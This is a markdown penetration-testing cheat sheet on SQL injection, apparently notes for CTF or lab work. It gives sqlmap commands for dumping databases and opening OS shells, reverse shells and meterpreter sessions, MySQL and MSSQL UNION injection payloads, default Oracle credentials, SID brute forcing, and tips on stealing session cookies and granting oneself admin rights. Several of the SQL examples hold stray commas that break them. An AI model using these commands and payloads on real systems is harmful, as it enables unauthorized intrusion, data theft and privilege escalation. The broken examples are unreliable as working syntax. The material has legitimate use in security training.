# Tips
- If a database has a table of session one can try to steal cookies or other credentials from the table to authenticate as another user.     
- If one is in a database with write access and there are roles assigned to users, give the current user admin rights.

# SQL injection cheat sheets
- [https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html)
- [https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
- [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


# sqlmap
## GET
Discover vulnerabilities in databases as well as dump info
```sh
sqlmap -u <URL> --batch
```

## POST
```sh
# With request file
# Add request into a log file (either from Burp or Chrome)
sqlmap -r <request_file> --batch

sqlmap -u <URL> --data "username=*&password=*"
```

## Commands
**To get data from any query use the `--dump` option**
```sh
# Get all databases
sqlmap -u <URL> --dbs

# Set DBMS
sqlmap -u <URL> --dbms="dbms"

# Database
sqlmap -u <URL> -D <database>

# Tables
sqlmap -u <URL> --tables -D <database>

## Specify table
sqlmap -u <URL> -D <database> -T <table>

# Columns
sqlmap -u <URL> --columns -D <database> -T <table>
```

## Shell
To get upload web interface look for `file stager` otherwise look for `backdoor` in the output.
```sh
# Exec command
sqlmap -u <URL>  --os-cmd <command>

# Simple Shell
sqlmap -u <URL> --os-shell

# Dropping a reverse-shell / meterpreter
sqlmap -u <URL> --os-pwn
```

### File upload
```sh
sqlmap -u <url> --data <data> --file-write <local_file> --file-dest <destination>
```

## References
- [https://0xdf.gitlab.io/2018/06/23/htb-falafel.html](https://0xdf.gitlab.io/2018/06/23/htb-falafel.html)
- [https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#shell](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#shell)
- [https://www.binarytides.com/sqlmap-hacking-tutorial/](https://www.binarytides.com/sqlmap-hacking-tutorial/)
- [https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/](https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/)


# MySQL 
## Structure
```
information_schema              Metadata and all the databases and tables
information_schema.schemata     Databases
information_schema.tables       Tables
information_schema.columns      Columns
```

### Example commands
```sql
-- Databases
SELECT group_concat(schema_name), from information_schema.schemata;

-- Tables from DB
SELECT group_concat(table_name), from information_schema.tables where table_schema='YOURDB';

-- Columns from table
SELECT group_concat(column_name),from information_schema.columns where table_name='TABLENAME';

-- Get data
SELECT data,data, from database.table;
```

## Union
When an application is vulnerable to SQL injection and the results of the query are returned within the application’s responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.

### Examples
```sql
-- If values are returned in order
SELECT a, b FROM table1 UNION SELECT c, d FROM table2

-- If more than one entry is returned but not all of the are in use
SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -
```

## References
- [https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635](https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635)

## User defined functions
[​​https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf](​​https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)


# MSSQL
## Union
Test the following query, it should dump all the data from the selected table.         
```sql
abcd' union select 1, concat(<data>,':',<data>) 3,4,5,6 from <table>;-- -
```      

*If the query needs to be edited, please follow the link in [the references](#references-1) below.*

# Oracle / ODAT
Use **[this](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf)** link as a reference for the steps described below 

## Basic creds 
``` 
Username --> Scott 
Password --> tiger
```

## Brute force SID  
1. Use: `odat` and its `sidguesser` to bruteforce with a link provided
2. Use metasploit and use `auxiliary(admin/oracle/sid_brute)`
3. Use `sqlplus` to login with the creds or
    1. Read file with odat:    
    ```sh
    odat ctxsys -s <ip> -d XE -U SCOTT -P tiger --sysdba --getFile flag.txt
    ```


# NoSQL
NoSQL injection knowledge base
A well curated list of tools and injection methods to use on NoSQL databases by **​[swisskyrepo](https://github.com/swisskyrepo)**  

## Help
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

​
# NoSQLMap
[Documentation and Release](https://github.com/codingo/NoSQLMap)
​​